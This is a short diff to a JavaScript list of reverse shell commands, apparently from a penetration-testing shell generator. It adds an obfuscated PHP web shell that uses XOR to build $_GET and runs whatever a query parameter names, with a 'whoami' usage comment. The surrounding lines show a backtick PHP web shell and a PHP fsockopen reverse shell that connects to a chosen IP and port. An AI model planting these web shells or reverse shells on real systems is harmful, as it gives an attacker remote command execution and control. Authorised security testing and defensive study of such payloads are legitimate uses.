@@ -161,6 +161,11 @@ const reverseShellCommands = withCommandType(
             "command": "<?=`$_GET[0]`?>",
             "meta": ["linux", "windows", "mac"]
         },
+    {
+            "name": "PHP cmd small 2",
+            "command": "<?=$_='$<>/'^'{{{{';${$_}[_](${$_}[__]);",  //Usage :=  test.php?_=whoami
+            "meta": ["linux", "windows", "mac"]
+        },
         {
             "name": "PHP exec",
             "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'",
